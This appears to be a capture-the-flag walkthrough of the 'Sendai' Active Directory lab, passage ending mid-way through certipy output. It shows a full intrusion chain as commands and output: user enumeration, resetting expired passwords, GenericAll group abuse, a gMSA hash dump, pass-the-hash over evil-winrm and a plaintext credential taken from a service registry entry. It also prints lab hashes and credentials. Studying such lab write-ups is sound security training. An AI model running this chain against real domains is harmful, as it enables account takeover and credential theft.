➜  Sendai rustscan -a 10.129.234.66 --ulimit=5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/faridd/.config/.rustscan.toml"
[~] For backwards compatibility, the config file may also be at "/home/faridd/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.234.66:53
Open 10.129.234.66:80
Open 10.129.234.66:88
Open 10.129.234.66:135
Open 10.129.234.66:139
Open 10.129.234.66:389
Open 10.129.234.66:443
Open 10.129.234.66:445
Open 10.129.234.66:464
Open 10.129.234.66:593
Open 10.129.234.66:636
Open 10.129.234.66:3268
Open 10.129.234.66:3269
Open 10.129.234.66:5985
Open 10.129.234.66:9389
Open 10.129.234.66:49664


➜  Sendai netexec smb 10.129.234.66 -u "guest" -p "" --shares
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config                          
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ            company share
SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
➜  Sendai 


➜  Sendai smbclient //10.129.234.66/sendai -N         
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Tue Jul 18 21:31:04 2023
  ..                                DHS        0  Wed Apr 16 06:55:42 2025
  hr                                  D        0  Tue Jul 11 16:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 21:34:15 2023
  it                                  D        0  Tue Jul 18 17:16:46 2023
  legal                               D        0  Tue Jul 11 16:58:23 2023
  security                            D        0  Tue Jul 18 17:17:35 2023
  transfer                            D        0  Tue Jul 11 17:00:20 2023

\hr
  .                                   D        0  Tue Jul 11 16:58:19 2023
  ..                                  D        0  Tue Jul 18 21:31:04 2023

\it
  .                                   D        0  Tue Jul 18 17:16:46 2023
  ..                                  D        0  Tue Jul 18 21:31:04 2023
  Bginfo64.exe                        A  2774440  Tue Jul 18 17:16:43 2023
  PsExec64.exe                        A   833472  Tue Jul 18 17:16:38 2023

\legal
  .                                   D        0  Tue Jul 11 16:58:23 2023
  ..                                  D        0  Tue Jul 18 21:31:04 2023

\security
  .                                   D        0  Tue Jul 18 17:17:35 2023
  ..                                  D        0  Tue Jul 18 21:31:04 2023
  guidelines.txt                      A     4538  Tue Jul 18 17:18:34 2023

There is only these files and everything else is empty. Let's get these files and read them.


smb: \> get incident.txt 
getting file \incident.txt of size 1372 as incident.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> cd security
smb: \security\> get guidelines.txt
getting file \security\guidelines.txt of size 4538 as guidelines.txt (6.7 KiloBytes/sec) (average 4.2 KiloBytes/sec)
smb: \security\> exit

Incident.txt only inform the users that most of your passwords were weak so we needed to sen new guidelines and etc. The second guidelines.txt shows the rules like : 3.3. Data Backup:
a. Users should regularly back up their important files and data.
b. Critical data should be stored on secure network drives or cloud storage.

There is not any credentials or etc.

There is also a list of username in sendai share:

\transfer
  .                                   D        0  Tue Jul 11 17:00:20 2023
  ..                                  D        0  Tue Jul 18 21:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 16:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 17:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 16:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 16:59:34 2023
  susan.harper                        D        0  Tue Jul 11 16:59:39 2023
  temp                                D        0  Tue Jul 11 17:00:16 2023
  thomas.powell       


I decided to enumerate users more and get a full clear user wordlist.

➜  Downloads nxc smb 10.129.234.66 -u 'guest' -p '' --rid-brute 

I copied the result in a file and implement these steps to get clean wordlist.
➜  Downloads nano users
➜  Downloads cat users| grep SidTypeUser
➜  Downloads cat users| grep SidTypeUser > newusers
➜  Downloads cat newusers | awk '{print$6}' | cut -d'\' -f2
➜  Downloads cat newusers | awk '{print$6}' | cut -d'\' -f2 > users.txt
➜  Downloads cat users.txt 
Administrator
Guest
krbtgt
DC$
sqlsvc
websvc
Dorothy.Jones
Kerry.Robinson
Naomi.Gardner
Anthony.Smith
Susan.Harper
Stephen.Simpson
Marie.Gallagher
Kathleen.Kelly
Norman.Baxter
Jason.Brady
Elliot.Yates
Malcolm.Smith
Lisa.Williams
Ross.Sullivan
Clifford.Davey
Declan.Jenkins
Lawrence.Grant
Leslie.Johnson
Megan.Edwards
Thomas.Powell
mgtsvc$


Now, i needed to verify these users are realy exist on the domain.

➜  Downloads kerbrute userenum --dc 10.129.234.66 -d sendai.vl users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/27/26 - Ronnie Flathers @ropnop

2026/10/27 08:22:05 >  Using KDC(s):
2026/10/27 08:22:05 >  	10.129.234.66:88

2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Administrator@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Guest@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Kerry.Robinson@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 DC$@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Dorothy.Jones@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 sqlsvc@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 websvc@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Naomi.Gardner@sendai.vl
2026/10/27 08:22:05 >  [+] VALID USERNAME:	 Anthony.Smith@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Susan.Harper@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Stephen.Simpson@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Marie.Gallagher@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Norman.Baxter@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Kathleen.Kelly@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Elliot.Yates@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Malcolm.Smith@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Jason.Brady@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Lisa.Williams@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Ross.Sullivan@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Clifford.Davey@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Declan.Jenkins@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Lawrence.Grant@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Leslie.Johnson@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Megan.Edwards@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 Thomas.Powell@sendai.vl
2026/10/27 08:22:06 >  [+] VALID USERNAME:	 mgtsvc$@sendai.vl
2026/10/27 08:22:06 >  Done! Tested 27 usernames (26 valid) in 0.458 seconds


I tried ASrep roasting because i dont need any credential for this.

➜  Downloads impacket-GetNPUsers sendai.vl/ -usersfile users.txt -no-pass -dc-ip 10.129.234.66 -format hashcat
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sqlsvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User websvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Dorothy.Jones doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kerry.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Naomi.Gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Anthony.Smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Susan.Harper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephen.Simpson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Marie.Gallagher doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kathleen.Kelly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Norman.Baxter doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Brady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Elliot.Yates doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Malcolm.Smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lisa.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ross.Sullivan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Clifford.Davey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Declan.Jenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lawrence.Grant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Leslie.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Megan.Edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Powell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mgtsvc$ doesn't have UF_DONT_REQUIRE_PREAUTH set


It didn't work. As you can see we said some users has really weak passwords. Maybe we can access with empty password.

➜  Downloads netexec smb 10.129.234.66 -u users.txt -p '' --continue-on-success
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 


Look carefully. Two of users Elliot.Yates and Thomas.Powell gave different errors. The other gave STATUS_LOGON_FAILURE but these two gave STATUS_PASSWORD_MUST_CHANGE error. 

I searched about this error on the internet and found a blog like this: https://www.netexec.wiki/smb-protocol/change-user-password

➜  Downloads nxc smb 10.129.234.66 -u Thomas.Powell -p '' -M change-password -o NEWPASS=password
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc000006c - STATUS_PASSWORD_RESTRICTION - When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.
➜  Downloads nxc smb 10.129.234.66 -u Thomas.Powell -p '' -M change-password -o NEWPASS=Password123#
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Thomas.Powell
➜  Downloads 

In this first command my password didn't match the password policy so i used stronger password and it worked.

SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Thomas.Powell:Password123# 

I did the same thing to elliot user as well.

➜  Downloads nxc smb 10.129.234.66 -u Elliot.Yates -p '' -M change-password -o NEWPASS=Password123#
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.234.66   445    DC               [+] Successfully changed password for Elliot.Yates
➜  Downloads netexec smb 10.129.234.66 -u Elliot.Yates -p 'Password123#'              
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Elliot.Yates:Password123# 
➜  Downloads 


None of them has winrm access to DC so i decided to look at bloodhound.

➜  Downloads netexec winrm 10.129.234.66 -u Elliot.Yates -p 'Password123#' 
WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) 
WINRM       10.129.234.66   5985   DC               [-] sendai.vl\Elliot.Yates:Password123#
➜  Downloads netexec ldap 10.129.234.66 -u Elliot.Yates -p 'Password123#' 
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.66   389    DC               [+] sendai.vl\Elliot.Yates:Password123# 
➜  Downloads bloodhound-python -ns 10.129.234.66 -d sendai.vl -u Elliot.Yates -p 'Password123#' -c All --zip

INFO: Done in 00M 48S
INFO: Compressing output into 20261027083514_bloodhound.zip


From Bloodhound:
Thomas is the member of Support group. This group has genericall privileges on ADMSVC group.This group has ReadGMSAPasswrod privilege on MGTSVC$ computer. Which is the Remote managament users group member.

Now, let use this genericall to add our thomas user to ADMSVC group.

➜  Sendai net rpc group addmem "ADMSVC" "Thomas.Powell" -U "sendai.vl"/"Thomas.Powell"%"Password123#" -S "dc.sendai.vl"
➜  Sendai net rpc group members "ADMSVC" -U "sendai.vl"/"Thomas.Powell"%"Password123#" -S "dc.sendai.vl"
SENDAI\websvc
SENDAI\Norman.Baxter
SENDAI\Thomas.Powell
➜  Sendai 

Yeah we have succesfully added to that group. Let's use ReadGMSAPassword privilege to see what is the password of MGTSVC$ user.
➜  Sendai python3 ../Tools/gMSADumper.py -u 'Thomas.Powell' -p 'Password123#' -d 'sendai.vl'
Users or groups who can read password for mgtsvc$:
 > admsvc
mgtsvc$:::88d544b552c4763c0333db7e48708a0d
mgtsvc$:aes256-cts-hmac-sha1-96:42591ecc6096132b213fc46d41a111a9091f97d40f82ee80a87955481128a773
mgtsvc$:aes128-cts-hmac-sha1-96:9f85af52920d9643ac7e290bf6347cfe
➜  Sendai evil-winrm -i 10.129.234.66 -u 'mgtsvc$' -H 88d544b552c4763c0333db7e48708a0d
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\mgtsvc$\Desktop> dir
*Evil-WinRM* PS C:\Users\mgtsvc$\Desktop> cd C:\
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-         7/18/2023   6:14 AM                $Recycle.Bin
d--h--         4/15/2025   7:55 PM                $WinREAgent
d-----         7/11/2023   5:56 AM                config
d--hsl         7/11/2023   9:36 AM                Documents and Settings
d--hs-         4/15/2025   7:25 PM                found.000
d-----         4/15/2025   8:20 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         4/15/2025   7:51 PM                Program Files
d-----         7/18/2023   6:11 AM                Program Files (x86)
d--h--         8/18/2025   5:40 AM                ProgramData
d--hs-         7/11/2023   9:36 AM                Recovery
d-----         7/18/2023  10:31 AM                sendai
d-----         7/11/2023   2:35 AM                SQL2019
d--hs-         7/11/2023   2:24 AM                System Volume Information
d-r---        10/26/2026   9:55 PM                Users
d-----         8/18/2025   5:04 AM                Windows
---hs-         4/15/2025   7:25 PM            112 bootTel.dat
-a-hs-        10/26/2026   8:34 PM          12288 DumpStack.log.tmp
-a-hs-        10/26/2026   8:34 PM     1476395008 pagefile.sys
-a----         4/15/2025   8:27 PM             32 user.txt


*Evil-WinRM* PS C:\> type user.txt
fff335936142d21a6fa44123b897cd3e



I noticed a unusual config file on the 'C:\' folder. Let's look what is in there.

*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/11/2023   5:56 AM                config
d-----         4/15/2025   8:20 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         4/15/2025   7:51 PM                Program Files
d-----         7/18/2023   6:11 AM                Program Files (x86)
d-----         7/18/2023  10:31 AM                sendai
d-----         7/11/2023   2:35 AM                SQL2019
d-r---        10/26/2026   9:55 PM                Users
d-----         8/18/2025   5:04 AM                Windows
-a----         4/15/2025   8:27 PM             32 user.txt



Why check services specifically
Windows services very often run with elevated privileges (LocalSystem, NetworkService, or a dedicated service account) and are frequently created by sysadmins doing something custom — monitoring agents, backup tools, helpdesk utilities, internal company software. Anything “custom” (not a built-in Microsoft service) is inherently higher-risk because:

    It wasn’t written by Microsoft’s security team.
    It was likely configured in a hurry by an admin who needed it running now.
    Admins commonly take the laziest path to authentication: hardcode a username/password straight into the launch command instead of setting up a managed service account or secure credential store.

Why ImagePath specifically
The ImagePath registry value is literally the exact command line Windows uses to start that service — binary path plus every argument. If a developer or admin wrote the service to accept -u username -p password as startup arguments (instead of reading creds from a vault, prompting securely, or using integrated auth), that credential sits in plaintext in the registry, readable by any authenticated user by default — not just admins. That’s the actual vulnerability: Windows doesn’t restrict read access to HKLM\SYSTEM\CurrentControlSet\services to privileged accounts only.

Why filter out svchost.exe
Because the vast majority of services on any Windows box are legitimate built-in Windows services, and almost all of them run via svchost.exe (a shared host process for DLL-based services). Excluding it isn’t “random” — it’s cutting out hundreds of boilerplate Microsoft entries so the 2-3 custom services an organization actually added stand out immediately. It’s a signal-to-noise filter, same logic as grepping out comments to find real code.



*Evil-WinRM* PS C:\temp> dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | `
  Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"

@{ImagePath=C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe}
@{ImagePath=C:\Windows\System32\alg.exe}
@{ImagePath="C:\Program Files\Amazon\EC2Launch\service\EC2LaunchService.exe"}
@{ImagePath="C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"}
@{ImagePath=C:\Windows\system32\AppVClient.exe}
@{ImagePath=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe}
@{ImagePath="C:\Program Files\Amazon\XenTools\LiteAgent.exe"}
@{ImagePath=C:\Windows\system32\certsrv.exe}
@{ImagePath=C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}}
@{ImagePath=C:\Windows\system32\CredentialEnrollmentManager.exe}
@{ImagePath=C:\Windows\system32\dfssvc.exe}
@{ImagePath=C:\Windows\system32\DFSRs.exe}
@{ImagePath=C:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe}
@{ImagePath=C:\Windows\system32\dns.exe}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath="C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc}
@{ImagePath="C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath=System32\Drivers\ExecutionContext.sys}
@{ImagePath=C:\Windows\Microsoft.Net\Framework64\v3.0\WPF\PresentationFontCache.exe}
@{ImagePath=C:\Windows\System32\ismserv.exe}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath="C:\Program Files (x86)\Microsoft\Edge\Application\139.0.3405.102\elevation_service.exe"}
@{ImagePath=C:\Windows\System32\msdtc.exe}
@{ImagePath=C:\Windows\system32\msiexec.exe /V}
@{ImagePath="C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath=C:\Windows\System32\lsass.exe}
@{ImagePath=C:\Windows\system32\ntfrs.exe}
@{ImagePath=C:\Windows\SysWow64\perfhost.exe}
@{ImagePath=C:\Windows\PSSDNSVC.EXE}
@{ImagePath=C:\Windows\system32\locator.exe}
@{ImagePath=C:\Windows\system32\RSoPProv.exe}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath=C:\Windows\system32\SecurityHealthService.exe}
@{ImagePath="C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"}
@{ImagePath=C:\Windows\System32\SensorDataService.exe}
@{ImagePath=C:\Windows\System32\snmptrap.exe}
@{ImagePath=C:\Windows\System32\spoolsv.exe}
@{ImagePath=C:\Windows\system32\sppsvc.exe}
@{ImagePath="C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\SQLAGENT.EXE" -i SQLEXPRESS}
@{ImagePath="C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"}
@{ImagePath="C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlceip.exe" -Service SQLEXPRESS}
@{ImagePath="C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"}
@{ImagePath=C:\Windows\System32\OpenSSH\ssh-agent.exe}
@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
@{ImagePath=C:\Windows\system32\TieringEngineService.exe}
@{ImagePath=C:\Windows\servicing\TrustedInstaller.exe}
@{ImagePath=C:\Windows\system32\AgentService.exe}
@{ImagePath=C:\Windows\system32\lsass.exe}
@{ImagePath=C:\Windows\System32\vds.exe}
@{ImagePath="C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"}
@{ImagePath="C:\Program Files\VMware\VMware Tools\vm3dservice.exe"}
@{ImagePath="C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"}
@{ImagePath=C:\Windows\system32\dllhost.exe /Processid:{05354908-93A6-4FE9-9A54-8367376F338A}}
@{ImagePath=C:\Windows\system32\vssvc.exe}
@{ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23050.5-0\NisSrv.exe"}
@{ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23050.5-0\MsMpEng.exe"}
@{ImagePath=C:\Windows\system32\wbem\WmiApSrv.exe}
@{ImagePath="C:\Program Files\Windows Media Player\wmpnetwk.exe"}
@{ImagePath=C:\Windows\system32\SearchIndexer.exe /Embedding}

I noticed a line in there like this:

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}


Let's see if it is valid.

➜  Sendai netexec smb dc.sendai.vl -u 'clifford.davey' -p 'RFmoB2WplgE_3p'
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p 
➜  Sendai 


This user is the member of CA-Operators group. I saw it on bloodhound.

I decided to look at if there is any vulnerability:

➜  Sendai certipy find -vulnerable -stdout -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -dc-host dc.sendai.vl    
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
